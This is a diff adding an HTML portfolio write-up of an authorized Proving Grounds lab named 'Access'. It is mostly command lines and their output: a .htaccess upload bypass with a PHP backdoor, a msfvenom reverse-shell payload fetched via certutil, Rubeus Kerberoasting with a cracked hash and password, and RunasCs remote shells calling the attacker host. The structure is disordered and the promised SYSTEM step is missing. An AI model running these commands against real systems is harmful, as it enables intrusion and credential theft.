@@ -1,0 +1,355 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab demonstrates exploiting a file upload vulnerability in a web application to gain initial access by uploading a .htaccess file and a web shell. Learners escalate privileges by leveraging the svc_mssql account&#39;s SeManageVolumePrivilege to gain full control over the C: drive, followed by executing a SYSTEM shell using a Windows Error Reporting (WER) exploit. This lab emphasizes web exploitation, Kerberoasting, and privilege escalation through volume management."><title>Proving Grounds: Access</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Active Directory</span><h1>Proving Grounds: Access</h1><p>This lab demonstrates exploiting a file upload vulnerability in a web application to gain initial access by uploading a .htaccess file and a web shell. Learners escalate privileges by leveraging the svc_mssql account&#39;s SeManageVolumePrivilege to gain full control over the C: drive, followed by executing a SYSTEM shell using a Windows Error Reporting (WER) exploit. This lab emphasizes web exploitation, Kerberoasting, and privilege escalation through volume management.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#privilege-escalation">Privilege Escalation</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>A foothold in the lab will be gained by leveraging a file upload function in a web application to upload a PHP web shell. Privileges will then be escalated to svc_mysql, abusing SeManageVolumePrivilege to achieve system access. This lab focuses on exploiting file upload vulnerabilities and privilege escalation methods.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab demonstrates exploiting a file upload vulnerability in a web application to gain initial access by uploading a .htaccess file and a web shell. Learners escalate privileges by leveraging the svc_mssql account&#39;s SeManageVolumePrivilege to gain full control over the C: drive, followed by executing a SYSTEM shell using a Windows Error Reporting (WER) exploit. This lab emphasizes web exploitation, Kerberoasting, and privilege escalation through volume management.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<h2 id="enumeration">Enumeration</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>(kali㉿kali)-[~/offsec/access]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sCV -p- 192.168.126.187                                                                        
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-08 19:16 -0400
+Nmap scan report for 192.168.126.187
+Host is up (0.028s latency).
+Not shown: 65508 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+|_http-title: Access The Event
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-08 23:17:16Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
+443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Access The Event
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+| http-methods: 
+|_  Potentially risky methods: TRACE
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49678/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+49719/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-06-08T23:18:13
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.75 seconds</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>┌──(kali㉿kali)-[~/offsec/access]
+# Run the helper or analysis script used in this lab step.
+
+└─$ python3 -m http.server 80                                                                    
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.126.187 - - [08/Jun/2026 20:06:21] &quot;GET /shell.exe HTTP/1.1&quot; 200 -
+192.168.126.187 - - [08/Jun/2026 20:06:21] &quot;GET /shell.exe HTTP/1.1&quot; 200 -
+^C
+Keyboard interrupt received, exiting.</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>iwr -uri http://192.168.45.205/Rubeus-1.4.1.exe -OutFile rubeus.exe
+PS C:\Users\svc_apache\Desktop&gt; .\rubeus.exe kerberoast /outfile:hases.kerb
+.\rubeus.exe kerberoast /outfile:hases.kerb
+PS C:\Users\svc_apache\Desktop&gt; dir
+# Inspect the directory for files relevant to the next step.
+
+dir
+
+
+    Directory: C:\Users\svc_apache\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----         6/8/2026   5:41 PM         211968 rub.exe                                                               
+-a----         6/8/2026   5:43 PM         210944 rubeus.exe                                                            
+-a----         6/8/2026   5:37 PM       11187200 win.exe                                                               
+
+
+PS C:\Users\svc_apache\Desktop&gt; iwr -uri http://192.168.45.205/Rubeus.exe -OutFile rubeus1.exe
+iwr -uri http://192.168.45.205/Rubeus.exe -OutFile rubeus1.exe
+PS C:\Users\svc_apache\Desktop&gt; .\rubeus1.exe kerberoast /outfile:hases.kerb
+.\rubeus1.exe kerberoast /outfile:hases.kerb
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : access.offsec
+[*] Searching path &#39;LDAP://SERVER.access.offsec/DC=access,DC=offsec&#39; for &#39;(&amp;(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))&#39;
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : svc_mssql
+[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
+[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
+[*] PwdLastSet             : 5/21/2022 5:33:45 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Users\svc_apache\Desktop\hases.kerb
+
+[*] Roasted hashes written to : C:\Users\svc_apache\Desktop\hases.kerb
+PS C:\Users\svc_apache\Desktop&gt;</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code>─(kali㉿kali)-[~/offsec/access]
+# Attempt to recover a password from the captured hash material.
+
+└─$ hashcat -m 13100 hashes.kerb /usr/share/wordlists/rockyou.txt           
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+* Device #01: cpu-sandybridge-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 2944/5889 MB (1024 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (3047 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$3947bf818d8de08dd7078c18a760e005$5eeb764e869f75b95a899116f99e25ef8f36f70e8c3d9c150cccf1f619da59138c1fa8826766e2974d6f98870cbb0f82f610482aa81772480fac85368799fba01c213e1edf8de4a679041c1c3500bd2ba9e44d84ba1b3834ef2b67e960e643c91d9ec0f4462cf140891064081f4d08c886ff67459825d02237d2e3518d7f943ecf06f0524e314891d8e08cf069a616c836ab33890b29c607c6bddfe75a1593ec118e10b9636663a127e0d57c5ed01553c65b59db283fa69682be5242e6bdcacf8240f710488725e2d518c73420185a9f829a31bc99dbd63f71fa722811f7fce71fc88adc368dbe8957125146410b20bcf006af2cf7765b668d901ed4e512886380572bc1bd66f742d81de132654cab35d5a35d403fb9a2a22829c2de8436550e6513845ac6bf3dcc8a2726139c1a1cdae37963ce70d0aacdfd16c40c8353a2ee82e5d4cb70466b01f80c87be84cff13d538ec51fb28e9637f5f3b16e7547d215ed3a44357f2d10bf33e634b63c0330c27785f303286c54191f567df201a0e0d3cc779f0f48cb3fbe0a3afbdbae038a9b61e5d400a5edd0d768b6fce597bf44a69c5404ea98d3268d8d6ae108df73827060eba0ec6ae7e810b4add481f9acc5a2c019c9cb13d59e2f007baac39f72b802af8b4935162a09926647d53fd4192cacfc89218a588dcacd6a1dcef76f189c75ea66c6c6cefbc5bda9d2c79a0912de1429b26e2f1fdda539989aaf6ee98127c66b7c0cfe45ee7e1e820a793dfa52868679ea84dfb5f8f523e2d9cc4095e9dfec6f3a8cbdd8842aa4678957711da9427c87a325cab344dadaecff928d73e5feaf17322b86bc4e7736e8c40f05b3c34e25d19b69926745bae5e99312aa3432efba69eb3c3184f8ffd436a968d8058db726560e32807c60ae53b3cec100d24137d0619b5f5e97c39e411374df61b3ba7db7a0625dde66f2bc7efd2ac2ef6e51885442d449146b5e885e20317ea1dd744c7b1c095c3971f256b6f4c09132f0e3d00113197aa8aa8e57b64bbdfbe6a208306bc33290e25cc1f3df5f0960bf1f9d8723574b4ee7f229d0f9c938d726c08ce5f432cf59b7d2ee6e9fc5f67cc6bef35c04473c1d35e0c9344f8d5715bdf304d22781883ad67805252535506ce088566953d625a961d7a81f682487e6f68a0f3fe40fe241081c1f323105db5fb2491122299880202234786368c68fe20f34631e1d615a866b09da23c8eea8020f7e1454871f0c309cbe79c02e89a2966dac6bfb0dbb8009077e555782e42208a231aa04ccc7342bfdb4adf86e5a6d93ce8a6fd885b6e453473000e20373231b76c472d851141084608d358103d96b0bbb6375fefb9b21fdb20f401972058704f66c58fc251f76313f86a3bd32837c8c491a318ab7923f742f89a06a86180b53b19d5e4efa3f2cf09c876fca861f63b68badfdc7b5f196f3b19236c74dc488fb637ed13504038ec7f1601b798b1cf0d49bb370ece143f3665aad27d6346d4390d14ed32ee4b407f31c69c4906c9a3200832ba093e7d441d5b817b349ce7bdb7364cfa941e89b56ca3a6b3521be58d8c0db13a3b426a23ae8e826b6dd64ba2be7927ac44af8e157:trustno1
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.ac...f8e157
+Time.Started.....: Mon Jun  8 20:48:43 2026 (1 sec)
+Time.Estimated...: Mon Jun  8 20:48:44 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:   348.2 kH/s (2.58ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 6144/14344385 (0.04%)
+Rejected.........: 0/6144 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: 123456 -&gt; iheartyou
+Hardware.Mon.#01.: Util: 32%
+
+Started: Mon Jun  8 20:48:42 2026
+Stopped: Mon Jun  8 20:48:45 2026</code></pre><p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># The output records the result observed during this authorized lab step.
+
+PS C:\Users\svc_apache\Desktop&gt; iwr -uri http://192.168.45.205/Invoke-RunasCs.ps1 -OutFile Invoke-RunasCs.ps1
+iwr -uri http://192.168.45.205/Invoke-RunasCs.ps1 -OutFile Invoke-RunasCs.ps1
+PS C:\Users\svc_apache\Desktop&gt; powershell -ep bypass
+powershell -ep bypass
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.</code></pre><h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>─(kali㉿kali)-[~/offsec/access]
+# Discover application paths and files that may expand the attack surface.
+
+└─$ gobuster dir -u http://192.168.126.187/ -w /usr/share/wordlists/dirb/common.txt 
+===============================================================
+# Discover application paths and files that may expand the attack surface.
+
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.126.187/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+.hta                 (Status: 403) [Size: 304]
+.htaccess            (Status: 403) [Size: 304]
+.htpasswd            (Status: 403) [Size: 304]
+assets               (Status: 301) [Size: 343] [--&gt; http://192.168.126.187/assets/]
+aux                  (Status: 403) [Size: 304]
+cgi-bin/             (Status: 403) [Size: 304]
+com1                 (Status: 403) [Size: 304]
+com2                 (Status: 403) [Size: 304]
+com3                 (Status: 403) [Size: 304]
+con                  (Status: 403) [Size: 304]
+forms                (Status: 301) [Size: 342] [--&gt; http://192.168.126.187/forms/]
+examples             (Status: 503) [Size: 404]
+index.html           (Status: 200) [Size: 49680]
+licenses             (Status: 403) [Size: 423]
+lpt1                 (Status: 403) [Size: 304]
+lpt2                 (Status: 403) [Size: 304]
+nul                  (Status: 403) [Size: 304]
+phpmyadmin           (Status: 403) [Size: 423]
+prn                  (Status: 403) [Size: 304]
+server-status        (Status: 403) [Size: 423]
+server-info          (Status: 403) [Size: 423]
+uploads              (Status: 301) [Size: 344] [--&gt; http://192.168.126.187/uploads/]
+webalizer            (Status: 403) [Size: 423]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+===============================================================
+uploaded a .htaccess file and added &quot;AddType application/x-httpd.php .php16&quot; --&gt; Uploaded simple backdoor .php16</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(kali㉿kali)-[~/offsec/access]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.205 LPORT=1234 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: shell.exe</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(kali㉿kali)-[~/offsec/access]
+# Retrieve and inspect the web response from the target.
+
+└─$ curl http://192.168.126.187/uploads/backdoor.php16?cmd=certutil%20-urlcache%20-split%20-f%20http://192.168.45.205/shell.exe%20shell.exe
+&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;
+
+&lt;pre&gt;****  Online  ****
+  0000  ...
+  1e00
+CertUtil: -URLCache command completed successfully.
+&lt;/pre&gt;</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(kali㉿kali)-[~/offsec/access]
+# Retrieve and inspect the web response from the target.
+
+└─$ curl http://192.168.126.187/uploads/backdoor.php16?cmd=shell.exe</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>─(kali㉿kali)-[~]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -nlvp 1234        
+listening on [any] 1234 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.126.187] 65236
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+# Confirm the identity of the current session.
+
+C:\xampp\htdocs\uploads&gt;whoami
+# Confirm the identity of the current session.
+
+whoami
+access\svc_apache
+
+C:\xampp\htdocs\uploads&gt;</code></pre><p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>(kali㉿kali)-[~/offsec/access]
+# Execute the next evidence-gathering step in the authorized lab.
+
+└─$ rlwrap nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.205] from (UNKNOWN) [192.168.126.187] 49813
+Microsoft Windows [Version 10.0.17763.2746]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>Exploit the file upload functionality to upload a .htaccess file and a PHP web shell.</li>
+<li>Use the web shell to establish a reverse shell as the svc_apache user.</li>
+<li>Perform a Kerberoasting attack to crack the svc_mssql account password.</li>
+<li>Exploit the SeManageVolumePrivilege to grant full control over the Windows directory.</li>
+<li>Exploit the unrestricted file write privileges to gain SYSTEM-level access and validate control over a vulnerable service. The exploitation of this service must be performed correctly, else a subsequent attack will fail. Please be sure to revert the lab between privilege escalation attempts.</li>
+</ul>
+<p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># Retrieve and inspect the web response from the target.
+
+└─$ curl http://192.168.126.187/uploads/backdoor.php16?cmd=whoami+/priv
+&lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;
+
+&lt;pre&gt;
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+&lt;/pre&gt;</code></pre><p class="code-brief">This block investigates or exercises a privilege-escalation path. The output is used to confirm elevated permissions or the conditions required to obtain them.</p><pre><code># The output contains credential-related evidence recovered during the lab.
+
+S C:\Users\svc_apache\Desktop&gt; Import-Module .\Invoke-RunasCs.ps1
+Import-Module .\Invoke-RunasCs.ps1
+PS C:\Users\svc_apache\Desktop&gt; Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.205:4444
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.205:4444
+[*] Warning: The logon for user &#39;svc_mssql&#39; is limited. Use the flag combination --bypass-uac and --logon-type &#39;8&#39; to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-3f265$\Default
+[+] Async process &#39;C:\Windows\system32\cmd.exe&#39; with pid 3744 created in background.
+
+PS C:\Users\svc_apache\Desktop&gt;</code></pre><h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
